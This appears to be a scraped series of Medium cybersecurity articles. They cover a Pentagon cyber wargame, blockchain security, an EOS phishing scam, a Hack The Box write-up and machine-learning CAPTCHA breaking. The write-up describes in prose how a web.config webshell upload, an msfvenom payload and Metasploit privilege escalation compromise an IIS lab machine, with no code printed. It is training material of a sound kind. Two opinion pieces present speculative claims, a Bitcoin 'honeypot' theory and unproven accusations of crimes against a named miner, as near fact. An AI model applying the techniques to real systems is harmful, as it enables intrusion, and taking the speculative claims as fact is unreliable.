In another mock cyber-strike, the red team gained access to critical information at nine American bases in the United States and Turkey via a phishing attack. Phishing involves sending fake messages — purporting to be from an official source — that ask for passwords or other identifying information. Three of the red-team phishing assaults gave the attackers unfettered access to secure systems.
The Pentagon spent nearly $290,000 on the exercise, drawing the money from a special account called the Combatant Commanders’ Initiative Fund. The money is there for “unforeseen contingencies,” according to a 2008 review of the program.
Despite the worrying results, U.S. Strategic Command praised the wargame for showing what was, and wasn’t, working when it came to security procedures. In many cases, physical protections and quick responses stopped attacks before they could do any real damage.
Defenders had “awareness of enterprise-wide attacks in minutes,” the review pointed out. Still, “many … focused on restoring service at the expense of defense.”
The exercise “did not give as much attention to resilience — operating through an attack/exploit — while defending and recovering as one might give today,” Visner noted. On top of that, the scenarios didn’t include private computers operated by defense contractors providing critical services or managing vital programs.
Visner pointed out that the concept of a military realm that extended into the “defense industrial base” was new in 2006.
Fast forward to 2016 and it doesn’t look like much has changed in the halls of the Pentagon or among its opponents. “The after-action report indicates that many of the concerns of 2016 were concerns in 2006,” Dr. Jeffrey Richelson, who currently manages the National Security Archive’s Cyber Vault project, told War Is Boring in an email.
The Pentagon has been consistent in its approach to cybersecurity. But how well that approach has worked is a major topic of debate in Washington.
For three years running, members of Congress have accused China and other countries of hacking the military’s and defense contractors’ networks. In one particularly troubling hack, Beijing may have stolen data from the F-35 Joint Strike Fighter program. Legislators have lambasted the Pentagon for not doing more to stop such intrusions.
“So it’s okay for them to steal our secrets that are most important because we live in a glass house?” Sen. John McCain, an Arizona Republican, angrily asked Deputy Secretary of Defense Bob Work at a hearing on Sept. 29, 2015. McCain had slammed Work over the Pentagon’s refusals to specifically name China as the culprit in some of the worst cyber-assaults.
Nine months earlier, terrorists linked to Islamic State briefly gained control of U.S. Central Command’s Twitter account. Elsewhere in the federal government, the Office of Personnel management admitted hackers had stolen millions of personal files from its servers in multiple attacks.
“I don’t think it is a question of things not having changed in a multitude of areas with regard to specifics,” Richelson said. “But that the general components of cyber-operations are the same because they are only logical components.”
In short, the Pentagon’s focus isn’t necessarily the problem. As the 2006 wargame showed, defending networks and bolstering defenses has been a long-standing and obvious goal. Instead, how military officials go about implementing the policy — or not — is the real issue.
Regardless of how small the improvements might be, the military “loves to pat itself on the back,” Robert Lee, a former Air Force cyber warfare officer and fellow at New America, a Washington, D.C. think tank, told War Is Boring in an email.
In 2009, the Pentagon stood up a central Cyber Command to try and fix the lingering issues. But after nearly seven years, the headquarters still hasn’t been able to solve the problems officials spotted back in 2006.
With regards to cybersecurity, the U.S. military “writ large has faced a culture change,” Lee explained. Still, “Cybercom is not ready,” he added.
Since the end of World War II, the Pentagon has sought technological solutions to specific problems on the battlefield. If your enemy has tanks, you buy more tanks and anti-tanks weapons. If your opponent sets up deadly surface-to-air missiles and powerful radars, you buy stealth fighters.
This thought process doesn’t translate well to problems in cyberspace, Lee said. While the central problem of defending networks might stay the same, the tools are constantly — and dramatically — changing.
The Pentagon has an ”over-focus on malware,” Lee said, referring to software that can hijack computer functions. “It’s just a tool.”
Hackers are constantly improving their technology and looking for new ways to infiltrate computers. And American troops are doing the same — sometimes. A May 2016 Government Accountability Office report pointed out that the Air Force is still using 40-year old computers and eight-inch floppy disks to manage certain parts of its nuclear mission.
More importantly, the flying branch is “still trying to figure out why this is important,” Lee added. It doesn’t help that the White House, Congress and the Pentagon can’t seem to decide whether cyberwarfare should be primarily offensive or defensive — or both.
With confusing and sometimes contradictory goals, the individual services have tried to implement their own, often disjointed, policies … as best they can. And yet, the training for cyber-troops is too frequently “abysmal,” Lee said.
The Pentagon’s 2006 plan to build a common cyber “range” where troops could practice network warfare “has made somewhat less progress than one would have imagined, based on the briefing’s clarion call,” Visner said. The unified training regimen could help standardize military cyberwar tactics.
But the military fears these lessons and tactics could, ironically, represent a juicy target for enemy hackers. So it’s wrapping cybersecurity efforts in layer after layer of classification, all of which complicate standardized training and operations across the military branches. It’s gotten to the point where it’s harder in many ways for military offices to buy a new router than for troops in the field to call in an air strike, Lee lamented.
That’s why Lee supports “taking off the training wheels” and turning Cyber Command into a free-standing headquarters with more freedom to make its own decisions. At present, Cybercom is a component of Strategic Command, but its top official is the head of the National Security Agency — arguably a needlessly complicated arrangement.
The nebulous command structure also means that Cyber Command never really has to own up to its own failings. It can to run to either of these other entities for help in a crisis.
Both NSA chief Adm. Michael Rogers and Secretary of Defense Ashton Carter back the proposal to expand Cyber Command and make it more independent. Congress is considering funding the expansion as part of the Pentagon’s budget for the 2017 fiscal year.
To really start fixing the Pentagon’s cyber-problems, Congress needs to outline clear policies for cybersecurity, Lee said. Only then will troops be able to develop workable plans.
Regardless, the Pentagon’s core cyberwar objectives are unlikely to change in the near future, Richelson added. While the exact tools and tactics might evolve, a decade from now troops could still be dealing with the same kinds of network threats.
Written by
","['Air', 'Land', 'Sea', 'History', 'Culture', 'Politics', 'Store', 'Cybersecurity', 'Us Military']"
Bitcoin is a honeypot and Satoshi Nakamoto is (was) a super secret agent.. now what?,https://medium.com/security-news/bitcoin-is-a-honeypot-and-satoshi-nakamoto-is-was-a-super-secret-agent-now-what-a49fad45552e?source=tag_archive---------7-----------------------,"Bad boys (and girls) are attracted to bright shiny objects, just as most of us are. They cannot resist the incredibly powerful magnetic pull of super shiny things, especially things that help them not get caught doing bad stuff.
So, let’s say you’re the NSA and you want to make it easier to identify “really” naughty people communicating with other naughty people, what might you do? Well, you might encourage the open source development of some provably unbreakable encryption like PGP that would be of great value to certain types of criminals.
Then perhaps with your NSA superpowers you might watch for “PGP Signals” travelling through cyberspace and pay a lot of attention to the coming and going of those signals, which you’re able to do because you’re already intercepting all telecommunications worldwide, bar none.
Or:
If you’re GCHQ you might come up with a badass “sounding” name (that sends the phonological loop into a frenzy) like “Satoshi Nakamoto” and strongly encourage the open source development of a provably secure honeypot currency called Bitcoin that comes with the big shiny bad boy magnetic “promise” of being capable of ** drum roll** “anonymity” **dun dun dun** — imagine that — it’s a bad boy’s wet dream come true.
So now what?
Let’s suppose you’re a criminal, you’re “all-in” with Bitcoin, you know it’s a honeypot, you know it’s a trap, you know the promise of anonymity is a lie and you know your hero Satoshi Nakamoto has betrayed you.. now what?
Well, human psychology says you‘ll ignore the fact that you can be caught (if authorities deem you worthy enough), and instead continue to be driven by the “belief of anonymity” that you’ve committed yourself to. You will continue to live in the most powerful honeypot ever invented and you will continue to enjoy the “thrill, excitement and danger” of it.
Of course, all of this is hypothetical right?
Please comment below, discussion is a good thing.
Article by:
Adam Sculthorpe, Co-Founder of PatrolX
0x7B1DEA01
Written by
","['Satoshi Nakamoto', 'Bitcoin Honeypot', 'Cybersecurity']"
Bitcoin’s Latest Scandal: How to Analyze the ASICBoost Mining Debate,https://medium.com/startup-grind/jihans-specific-sins-11c5c63d1b9f?source=tag_archive---------5-----------------------,"Too many strawman arguments are flying around the Bitcoin space right now about how Jihan Wu, with his alleged covert ASICBoost modification, is mining selfishly but not really doing anything wrong since we can expect miners to seek maximum profits. This harmful behavior must end now.
Jihan’s unfair earnings have been calculated by two different developers now to be in the neighborhood of $100 million per year. If his sin was only making a better product that earned that much money, I’d be trying to cozy up to him and get him on my good side today. I’ve got no problem with winners.
But that’s not his crime. If Greg is correct in his accusation, Jihan was causing unimaginable amounts of harm to Bitcoin, which if left unchecked, may even lead to it’s doom.
There may be other sins, but these are top three problems I can see covertly mining ASICboost in the way Greg describes:
If Greg is correct, the entire blocksize debate since ~2014 was little but Jihan’s way to keep us fighting against each other so that Bitcoin will not scale up in a way that blocks Jihan’s edge. It appears that SegWit and many other scaling upgrades with a similar solution are upgrades that Jihan cannot allow to ever happen since he got his ASICBoost tech deployed.
Since that time, early 2015, this community has split into two communities at each other’s throats and there has been wave after wave of challengers to the Core devs… (Bitcoin Classic, BitcoinXT, BU, and now Extension Blocks) — All that do not use the upgrade that nullifies the gains from ASICboost.
If Greg is right, Bitmain signaling for BU and all of its efforts to oppose SegWit were never for ideological reasons, just financial. It means that our fight was a delay tactic, so he could earn more money, plain and simple.
So many friendships lost, so much time and effort wasted…
Think of all the energy that developers could have been put into scaling bitcoin that was instead spent on defending themselves from attack; it’s unfathomable.
As to how anyone would be able to force us to fight each other, I’ll simply link readers to explanations of the well-established concepts of sockpuppetry and agent provocateurs, and allow your imagination to go wild with how much strife Jihan would be able to accomplish using those two methods with his war chest of up to $100 million per year.
Because of this strife, many have turned to altcoins, and many people and businesses outside of bitcoin did not join us that would have otherwise. Because of this strife, we haven’t scaled Bitcoin in any meaningful way yet, and that has stopped many desirable use cases that depend on micropayments from being completed, including Code Valley, Yours, MegaUpload2, and tons of other projects and infrastructure… Which again, turns businesses away from embracing bitcoin. (And startups from starting up.)
Today’s price would likely be $6,000 or higher, IMHO, if it weren’t for that loss of our cohesion that it appears Jihan personally created sometime before 2015.
Bitcoin’s cryptographic security relies on creating as much hard work for a would-be attacker as possible, as measured in the number of operations a task requires to be computed. As Greg Maxwell has explained on the Devlist, the attack is highly technical in nature so it’s hard for most to understand the significance, even among other devs. “While talking about it privately for the last month I ran into many experts that kept lapsing into thinking that the collision required 2³² work, and other misunderstandings,” he said.
A great, recent writeup by MIT’s Jeremy Reubin is here, but Greg was correct to describe it as difficult to understand. What follows is my imperfect summary, for those who won’t take the time to read it for themselves.
Apparently, the SHA2–256 cryptography behind Bitcoin’s mining function uses a “merkle damgard hash function” that all miners have to perform in order to keep looking for those special numbers to submit like lotto tickets every ten minutes.
Without using the covert version of ASICBoost, the odds of winning were equal for all miners, in relation to their hashing power, because the amount of work was equal for everyone.
In this case, Greg has accused Bitmain of changing his process, deep inside the hardware where you can’t look at the code, to make a big shortcut in the merkle damgard hash function so that it ‘grinds on the version bits’ of the Merkle root, which cheats the process by shuffling transactions that it processes. Detecting actual usage of this is impossible, only statistical evidence of the output can be detected.
Meanwhile, the process of making bitcoin secure with mining has been compromised. Instead of all miners competing on a level playing field, Jihan’s miners have allegedly been taking the shortcut, doing less work to win more blocks. That’s textbook bypassing of a basic security in Bitcoin.
This process cannot be done mistakenly, because doing it this way would normally be very wasteful, since the process trades away system RAM and extra SHA256 calculations in order to shuffle the transactions in a different order to pull this off. It’s a very blatant cheat and serves no other purpose but trading away security for extra money, and only in a very certain set of circumstances does it pay off. Jihan’s exact circumstances.
Use of this process also explains all of the empty blocks that Jihan has been defending the right to create, despite how much we all need more space in our Blocks due to the high number of transactions these days.
Bitmain has officially denied USING this process on Bitcoin’s mainnet, and that is now 100% of the point of contention we need investigated thoroughly.
This merklegrinding is the part that Core developers are calling the “attack,” just as they would anything else that tries to bypass Bitcoin’s security defenses. If Greg is correct, bitcoin has been far less safe than it should be for as long as Jihan has been doing this covertly. That could be as far back as 2014.
If he is using this unfair advantage, Jihan has already put at least two competitors out of business that couldn’t figure out why they failed. In May 2016, Now-bankrupt KNC Miner’s CEO Sam Cole was interviewed and said a few things about Bitmain that explain a lot today if Greg is correct.
“The competition has increased more than we could ever anticipate. When we crunch the numbers it amounts to hundreds of millions of dollars that have been invested only in the past six months… Even if they have free electricity we can’t understand how they can make a profit” — Cole
KNC was only the most recent Bitcoin mining company to go under since Jihan got his ASICBoost patent. The Israeli Spoondoolies tech was another, and they suffered a very similar fate. Despite revenues of $28 million in 2015, the company went bankrupt early the following year after multiple fundraising attempts. It too said that the only reason for their failure to stay profitable was competition with a China-based bitcoin hardware developer.
If all mining manufacturers were in China, then Bitmain’s Chinese patent on ASICBoost tech would have allowed him to keep down the competitors and all of this would have been transparent. Spoondoolies and KNC were in Israel and Sweden, however, where Jihan’s patent are meaningless, so it best serves Jihan to stay quiet about the reason. This appears to be a lack of communication in the industry, however, because even some Core developers knew about Jihan’s 2015 patent on ASICBoost since May 2016.
Imagine how many other mining manufacturers would have started up on level playing field… Maybe we’d have 20 different chip makers today instead of the 2–3 we have now? Now, imagine how hard it must be for a new chip manufacturer to launch today… No matter how awesome your fabrication process, now matter how much capital you have access to, someone else out there will still make a product that is 20%-30% more efficient than yours and sell it worldwide. That’s an insurmountable profit margin. Zero investors out there would be willing to loan to such a startup today.
Meanwhile, mining centralization has been a top-5 threat on the Core dev’s list of bitcoin-killers since the very day ASIC manufacturing was announced.
Who in the community during the summer of 2014 can forget the defcon-5-level of panic when pool Ghash.io attained 51% of the mining hashrate? Conspiracy theories were everywhere and many were demanding that the Core devs find a way to stop Ghash forcefully, so they couldn’t do a 51% attack against the network.
Thankfully, Ghash was a good neighbor and broke up their own monopoly voluntarily. ‘Good guy Ghash’ — I think some T-shirts were printed with the slogan.
Bitmain doesn’t appear to want to take the same paycut, since they are busy defending their innocence. If the allegations are correct, anyone using their chips or mining in their pools should be eyed with even greater panic and disdain than Ghash was; If, again, the charges are founded. Siding with centralization is siding against Bitcoin, plain and simple.
Let me make this point clear: It does not matter that Jihan has admitted to Building ASICBoost into his chips. As long as he says he did not use it, he is claiming innocence, and that creates problems.
The difference is very important; If developers simply try to block covert ASICBoost without holding Jihan accountable for these crimes, then Jihan is not only free to commit more crimes, but he will in fact GROW his following of supporters who feel that he is being attacked by “Core devs” unfairly.
It is the followers, not Jihan, who need to be shown indisputable evidence of Jihan’s wrongdoing. Any attempt to upgrade the network to fight Jihan may very well come down to their support.
We have to let science decide, of course. We must encourage many peer review teams, hopefully some from outside the community too for unbiased opinions, to review Greg’s evidence and redo the tests for themselves. We may even need to do some crowdfunding in order to afford these tests.
Although direct proof of Jihan’s covert usage may be impossible, incontestable evidence could still be gathered that is too strong for anyone to reject. (i.e. Compute the probability of his actual results matching a set of ASICBoost-derived results.) If the claims cannot be disproved, then Greg will be more and more shamed over time by much of the community, and perhaps even unemployable in the long run. Instead of being a hero to all Bitcoiners, he stands to lose most of the remaining respect he had in the community if current trends persist. Not to mention, SegWit becomes far less likely to pass.
However, no matter how much Greg’s detractors feel that he gets on their nerves with his occasional trolling and less-than-humble attitude, he’s also a PhD with some incredible development skills that are well respected across several industries. He’s no dummy.
I cannot in good faith proclaim that he is absolutely correct yet, but I expect that we could do so definitively if the evidence is pursued. Only once it has, will we be able to act on one course or another immediately to stop these major problems already occurring in Bitcoin now. Calls for UASF or forks of any kind to enable Segwit are too drastic until we have this key evidence.
After proving Jihan’s usage, the next step would then be to decide if we just want to do Greg’s latest BIP that only targets Covert ASICboost usage, or do we want to disable All ASICBoost usage, like Peter Todd promotes. Surely there would be more support on the former but added advantages on the latter.
Every day we waste allowing the idea to flourish that Jihan did not commit these crimes to the community, we allow his following and SegWit resistance to grow stronger.
Written by
","['Founder Stories', 'VC Corner', 'Bitcoin', 'Blockchain', 'Tech', 'Cybersecurity', 'Ethereum']"
Black Hat Python — Encrypt and Decrypt with RSA Cryptography,https://medium.com/@ismailakkila/black-hat-python-encrypt-and-decrypt-with-rsa-cryptography-bd6df84d65bc?source=tag_archive---------5-----------------------,"Its very straighforward to encrypt/ decrypt files using Python. In this post, I will show a few scripts to accomplish this.
We generate the pair using 4096 bits private key length:
We will be using this image file:
and this encryption script:
The resulting encrypted file:
We can use the following decryption script:
Hope this helps someone!
Written by
","['Security', 'Cybersecurity', 'Python', 'Crypto']"
Blockchain Security for Enterprise: How safe is it?,https://medium.com/blockchain-review/blockchain-security-for-enterprise-how-safe-is-it-aaad560f6b1e?source=tag_archive---------6-----------------------,"The Blockchain is the underlying technology supporting digital currencies like Bitcoin; it’s a decentralized platform that securely processes transactions through encryption[1].
Since this technology cannot be owned by any one person, company, or entity, and each user has the ability to view or access the state of Blockchain at any given time, the Blockchain has become increasingly lauded as a new underlying protocol and infrastructure to do completely new and revolutionary functions that have a great impact on business, industry, government, and potentially society.
As a notable basis to the protocol, the security and verifiability of data and its transfer is achieved using mathematically designed cryptosystems.
Miners, as they are called, who are a network of computers forming a validated consensus of the state of the blockchain, are scattered all over the globe. This network, by nature and design is decentralized and crypto-economically incentivized to be resilient to attacks.
The decentralized consensus nature of blockchains (in this case Bitcoin) renders them almost impossible to break at its core; as an attacker or group of attackers would require the computational hashing power of a nation state and all the tech companies therein to overcome the more than 51% computational power of the network.
“The blockchain has the ability to enhance reliability in business processes by eliminating political and economic risks associated with trusting a centralized system.–Vitalik Buterin [2],
Trust and transparency can run together while leaving a public audit trail for their activities for everyone to check its validity.
The cyberspace is the underlying infrastructure that holds the key to the modernity in technology.
However, its vulnerability to attacks complicates the essence of its existence, therefore it’s crucial for developers to put up concrete cyber security measures for safety and integrity of data [3].
“The fact that traditional systems work in a centralized manner render them readily prone to attacks since the attackers only target the central server.–Buntinx [3],
This is what’s called a single point of failure, or a “honey pot” problem.
A Blockchain inherently offers a distributed and decentralized network systems thereby eliminating these single points of failure.
They also offer encrypted authentication, digital signatures and public key encryption, distributed ledgers based on consensus, smart contracts, and fault tolerant transaction processing.
The integration of consensus mechanisms in the Blockchain network is a breakthrough in cyber security that actualized the ability to keep hackers out [3].
One of the driving factors that led to the invention of Blockchain technology is the need for confidentiality, integrity, and authentication for financial-related information.
The level CIA standards of information security are achieved in Blockchain technologies through the implementation of cryptography and encryption methods in the relay, processing, and storage of data.
Encryption may be defined as a cryptographic technique that entails the use of a complex mathematical algorithm to encrypt (close) and decrypt (open) data.
The essence of Homomorphic encryption is to enable for computations on encrypted data before its actual decryption [4].
Currently, data privacy and transactions is upheld since computations may be done on the data but only those with the decryption key may access its contents [4].
Homomorphic encryption occurs in two main processes that are full and semi-complete arithmetic schemes.
Fully Homomorphic encryption schemes are said to be Turing-complete since they allow for both addition and subtraction operations on the ciphered messages. On the contrary, Semi homomorphic schemes like RSA only support one arithmetic operation on the ciphered text.
An essential interaction for a Blockchain can be determined through Zero knowledge Proofs, cryptographic techniques that require two transacting parties, a prover, and a verifier, to prove some propositions about the transaction without having to be true without having to reveal all its information [4].
For a zero-knowledge proof to be considered valid, they must meet three conditions:
Strictness: the honest prover must follow the protocol by convincing the honest prover with the correct statement.
Accuracy: No false statement would be used by a cheating prover to convince and honest verifier except when the statement has some truth probability in it.
Zero-knowledge: when the main statement is true, all the cheating verifiers will only learn about this fact. It is achieved through simulating the process to each cheating verifier without access to the validator, given the statement to proof; it produces a mimic of the interaction between the honest prover and cheating verifier.
A Blockchain is commonly known for its potentially resilient combination of safety features. Information Age [5] explains that a Blockchain as a holistic approach to the traditional endpoint protection with additional features for user privacy, communication and transaction security, business and system security through transparency, audit trail, and distributed encrypted nodes. Across blockchains protocols, safety and confidentiality are highly prioritized as central pillars for maintaining the growing digital age.
It can be said that where individuals, businesses, and governments are constantly locked in a battle against bugs, fraud, and malicious actors, blockchains propose an alternative.
The fact that the emerging blockchains can offer utmost data integrity, high-tech digital identity systems, and public/transparent audit trails reinforces the above statements. I would highly encourage enthusiasts to look into a little known, but emerging blockchain startup company called BackFeed who are working on these types of protocol innovations.
Most “blockchain” protocols are designed as a decentralized peer to peer networks that allow members to jointly store and run computational operations on the data without compromising the security and privacy[6].
Encryption has successfully been used as a data protection technique, but the vulnerability occurs when the user decrypts the data. The encrypted data can be kept in secure cloud files free from hackers by keeping the secret key safe. However, whenever the users need to access the data, they may have to unlock it and hence rendering it prone to hackers [6].
The consensus is the protocol used to limit all transacting parties to adhere to the set consistency and the agreed distributed order of recording approved transactions thus creating an interconnected data store known as the distributed ledger [7]. Since a consensus must be reached, the common blockchain protocol rules are that a hacker must have at least 51 percent of the computational energy to break the consensus algorithm which may potentially be achieved using quantum computers.
Zyskind, Nathan, and Pentland [8] wrote that “[Enigma] is a peer-to-peer (P2P) network, enabling different parties to jointly store and run computations on data while keeping the data completely private”.
Its computational model relies on the latest improved multi-party computation version, secured with a verifiable private-sharing scheme. It utilizes an improved distributed hash-table as its storage facility for the encrypted data [8].
It uses an external Blockchain to control its network, authenticate access, monitor and enable uninterrupted log of events.
Enigma has proved its worth having won the final round of the MIT Bitcoin Project’s Summer Startup Competition 2014. Courtesy of its creators, vibrant final presentation of its prototype, Amir Lazarovich & Guy Zyskind, MIT Media Lab students and Oz Nathan, a Bitcoin entrepreneur, the team, won $5,000 grand prize among other prices in the previous rounds. A small prize given the innate transformational power that their protocol has innovated.
Hawk is a decentralized platform for writing smart contracts that hide the financial transactions it stores on the Blockchain to maintain the privacy of transaction data from the public view [9].
The Hawk system allows programmers to write private smart contracts without having to implement cryptography instantly; the compiler is perfectly designed with cryptographic primitives like zero-knowledge proofs to automatically generate efficient cryptographic protocols to enable the interfacing between the Blockchain and contracting parties.
Hawk embraces the formalized cryptographic model of Blockchain that allows for full security of its protocols. The Hawk formal modeling is a standard way of designing apps to run on decentralized blockchains.
Ethereum is a cryptocurrency built in Turing-complete language by Vitalik Buterin. Like Bitcoin, it allows for numerous interactions organization and execution through increased reliability, reduced business and political risks linked to centralized ownership, and eliminates the need for trust [2].
Ethereum Blockchain offers a platform through which different types of applications from different companies can run together while allowing efficient and seamless interaction where an audit trail is produced to keep track of the processing of data.
Hackers and attackers may employ Blockchain cryptographic algorithms and mechanisms to perform malicious activities without leaving any traces one, most notably is what’s called a sybil attack. Cryptosystems have also led to the rise of the dark web where illegal goods and services are traded beyond governmental authorization or consent. For instance, the anonymity feature in Bitcoins has sparked a global uproar in the financial technology scams and thefts.
Information encrypted in cryptosystems may not be accessed if the real user forgets or loses the private or decrypting keys hence they may not recover their rightful data unless they have spare keys correctly backed up.
Blockchain Technology has evolved over the last few years, initially known as the underlying Bitcoin technology infrastructure for sending secure payments, or transfers of value, and has gained reputation, if not over-hyped potential, from this pioneering implementation. The Bitcoin Blockchain has clearly demonstrated the power of decentralized peer to peer applications regarding both security and privacy of data. Having passed the test of time, we can only appreciate its resilient security and adopt it to embrace and take advantage of this high-level technology.
Originally published at intrepidreview.com on October 10, 2016.
I’m always interested in meeting blockchain startups, and Chief innovation officers who are creating transformational products, so please feel free to contact me on linkedin , or by email at collin@intrepid.ventures
Collin Thompson is the Co-founder, and Managing Director of Intrepid Ventures, a blockchain startup and innovation studio that invests, builds, and accelerates Blockchain and FinTech companies solving the world’s most difficult problems. Collin focuses on early stage investments, innovation and business design for corporations, governments and entrepreneurs working with blockchain technology.
Written by
","['Studio', 'blockchainreview.io', 'Blockchain', 'Bitcoin', 'Ethereum', 'Cybersecurity', 'Digital Transformation']"
Block.one was Hacked EOS tokens worth Millions Scammed from Investors,https://medium.com/@Michael_Spencer/block-one-was-hacked-eos-tokens-worth-millions-scammed-from-investors-ac9b0484515e?source=tag_archive---------7-----------------------,"All is not well in the EOS MainNet launch. An elaborate scam has taken place with the victim being Block.one. The internal system of the parent company of EOS ICO was compromised by some digital hackers, and it apperas Investors have lost millions of dollars.
According to Fortune, the hack plot was pretty straight forward: some anonymous online scammers had hacked into the system of Block.one, and scammers sent messages to the investors of EOS. The details of the investors were breached by the hackers and this information was used to steal EOS [EOS] and Ethereum [ETH] tokens from the investors.
This means some of the $4 Billion of a year long ICO by EOS won’t ever reach their destination, that is, to fund the development of new blockchain software by a startup called Block.one, co-founded by former actor Brock Pierce.
They allegedly made use of the compromised email platform, which was powered by the cloud software provider, Zendesk. It seems crypto projects are like feeding grounds for fraud, scammers and simple hacks such as this. The details of thousands of investors were extracted by the investors, which helped them steal their EOS and Ethereum (ETH) tokens worth millions.
The scammers pretended to provide free tokens as part of a giveaway. The investors were looking forward to getting free EOS and ETH tokens, instead, the hackers stole the coins that they had. The investors lost millions of dollars.
While Investors have trusted Block.one. and while Block.one has sold almost all of its one billion EOS coins to investors, a significant portion of them — along with the cryptocurrency Ethereum often used to purchase EOS — are ending up in the hands of hackers. It’s not known yet how much, according to the sources I could find covering this early story.
Even Fortune was the recipient of the scam: this often takes the form of a sophisticated-looking email, four of which were sent directly to my Fortune inbox. The emails, two of which came bearing the subject line “The most anticipated event has arrived!,” feature EOS’s gem-like chestahedron logo and multiple links to Block.one’s actual website (including in an official-seeming copyright line at the bottom).
Block.one has admitted over the weekend that an intruder had managed to breach its email support system, operated by cloud software provider Zendesk. Therefore it would seem they are at least somewhat responsible and potentially legally liable.
Users on Reddit of been lamenting that they fell for the scam and lost typically tens of thousands of dollars. Although Block.one temporarily shut down its Zendesk system and urged its supporters to be on “high alert for scams” in a statement published on its website Sunday, the phishing attacks have continued on other fronts.
While phishing scams typically target the elderly and vulnerable. MainNet launches and ICOs where transference of funds take place are prone to these sorts of scams too.
The EOS attacks are cunningly designed to make victims let their guard down. It’s very hard to tell that they have been led down a dummy fake micro-site. Ironically, the same web page that steals private keys is plastered with phishing warnings and security reminders that make visitors feel safe. Above all, token giveaways (at the end of an ICO) should be considered suspicious and warrant extra vigilance.
Written by
","['eos.io.', 'Blockchain', 'Cybersecurity', 'Ethereum', 'ICO', 'Fraud']"
Bounty Write-up (HTB) - CTF Writeups - Medium,https://medium.com/ctf-writeups/bounty-write-up-htb-9b01c934dfd2?source=tag_archive---------9-----------------------,"This is a write-up for the recently retired Bounty machine on the Hack The Box platform. If you don’t already know, Hack The Box is a website where you can further your cybersecurity knowledge by hacking into a range of different machines.
TL;DR: .config webshell & Metasploit Privesc. | In this box, I wasted a lot of time trying to get an initial foothold, since it’s rare to have to perform so many different dirb scans in order to find anything useful. However, once I worked out what I had to do, the box was both fun and interesting. Since I don’t know much about Microsoft Server security, Windows boxes are always a challenge to complete.
Let’s begin with an nmap scan, so that we know how to interact with the server:
We now know that the server is serving HTTP on port 80, and that the server is running Microsoft-IIS, which will likely be useful later on.
When visiting the site, we see nothing but an image of a wizard:
I checked the source code of the page, but unfortunately there wasn’t anything interesting there. Since we have nothing else to go on, I started some dirb scans.
We already know that the server is running Microsoft IIS, so I decided to try an IIS-specific wordlist on the page (the following dirb scans have been condensed for clarity):
I then tried to access these two directories, but was given 403 errors both times.
After doing a bit more research on the aspnet_client folder structure, I discovered that we could work out the system version by fuzzing various system_web directories. As such, I saved the list found here, and used dirb to try them all:
Thanks to this, we know for sure that the server is running Microsoft IIS 2.0.50727. Whilst this might not be useful, it’s always good to enumerate where we can.
That being said, we still get a 403 when trying to access this new-found directory, and so I swapped over to a bigger wordlist:
It looks like we’ve finally found something interesting!
I took a look inside of the uploadedfiles directory, but received another 403 error. However, since this directory exists, we can assume that there is a webpage somewhere where we can upload files.
I then started my final dirb scan on the website in an attempt to find this upload page. Seeing as we know that the server is running Microsoft IIS, I decided to scan for only .aspx files, because they’re very common in systems like this.
It looks like we might have now found the upload page:
Let’s now try uploading test.aspx:
It looks like we’re going to have to either try fuzzing the upload, or enumerate further.
Since fuzzing is never fun, I decided to try and find some more IIS-related file extensions.
Fortunately, I just had to google “microsoft iis file extensions” to find this forum page, which says the following:
We are serving up files for our own application for download from web servers, including IIS. One such file has the .config extension. Turns out that IIS won’t serve this because it thinks it’s a config file of its own.
Let’s now try uploading a .config file, to see if that’s allowed:
It looks like we can successfully upload files! After doing some research on .config files, I came across this article which outlines an easy attack that we can perform (provided that the server executes the file). We’ll do something similar to the technique used in PHP reverse shells, in that we’ll upload the web.config asp file, and the server should interpret whatever we write and show us the output.
We can perform an initial test by uploading a script found on that same website, which should simply add 1 and 2, and output the result:
Now that our POC command execution has worked, let’s make our web.config file more useful.
My final payload has been bodged together from different scripts found online, with the majority of the “good” code taken from here. So, the webshell looks as follows:
With that uploaded, we can open it in the /uploadedfiles/ directory, and start executing some commands:
Now that we have a working webshell, let’s try and upgrade it to a “proper” shell. To do this, we must first generate a payload with msfvenom. I checked the system architecture on the webshell and found that it’s running x64, which means that we can make our payload x64 specific (I spent a couple of hours trying to get a payload running, before learning that this only works when x64 is specified).
Since explainshell.com doesn’t have the msfvenom manpage at the time of writing, I’ll briefly go over it here:
Before we upload our payload, we also need to add .config on the end, so that we’re actually allowed to upload it.
I then setup my meterpreter shell, so that I was ready to catch the requests. With that setup, we can upload our payload.exe.config. All we need to do is rename the file and execute it!
After running this final command, we have a shell!
And since we now have a shell, we can easily read the flag:
Unlike user, root was trivial to get, since Metasploit does all of the work for us.
I first ran Metasploit’s own exploit suggester, to check for any obvious exploits:
Let’s start off by trying the first one. We can background the session with “background”, and then run this exploit separately:
And then, we can run the exploit…
…and read the root flag:
Contact me:Personal WebsiteTwitterGithubHack The Box
Written by
","['All CTFs', 'ReplyCTF 2018', 'George Omnet', 'Writeup', 'Cybersecurity', 'Ctf']"
Breaking CAPTCHA Using Machine Learning in 0.05 Seconds,https://medium.com/towards-artificial-intelligence/breaking-captcha-using-machine-learning-in-0-05-seconds-9feefb997694?source=tag_archive---------2-----------------------,"December 19, 2018 by Roberto Iriondo
Everyone despises CAPTCHAs (humans, since bots do not have emotions) — Those annoying images containing hard to read text, which you have to type in before you can access or do “something” online. CAPTCHAs (Completely Automated Public Turing tests to tell Computers and Humans Apart) were developed to prevent automatized programs from being mischievous (filling out online forms, accessing restricted files, accessing a website an incredible amount of times, etc.) on the world wide web, by verifying that the end-user is in fact “human” and not a bot. Nevertheless, several attacks on CAPTCHAs have been proposed in the past, but none has been as accurate and fast as the machine learning algorithm presented by a group of researchers from Lancaster University, Northwest University and Peking University showed below.
One of the first known people to break CAPTCHAs was Adrian Rosebrock, whom in his book “Deep Learning for Computer Vision with Python,” [4] Adrian goes through how he bypassed the CAPTCHA systems on the E-ZPass New York website using machine learning. Where he used deep learning to train his model by downloading a large image dataset of CAPTCHA examples in order to break the CAPTCHA systems.
The main difference between Adrian’s solution and the solution from the research scientists from Lancaster, Northwest and Peking, is that the researchers did not have a need to download a large dataset of images in order to break the CAPTCHAs system, au contraire, they used the concept of a generative adversarial network (GAN) in order to create synthesized CAPTCHAs, along a small dataset of real CAPTCHAs in order to create an extremely fast and accurate CAPTCHA solver.
Generative adversarial networks, introduced by Ian Goodfellow along other researchers [2], are deep neural net architectures comprised of two neural networks, which compete against the other in a zero-sum game [3] in order to synthesize superficially authentic samples. These are especially useful in scenarios where the model does not have access to a large dataset.
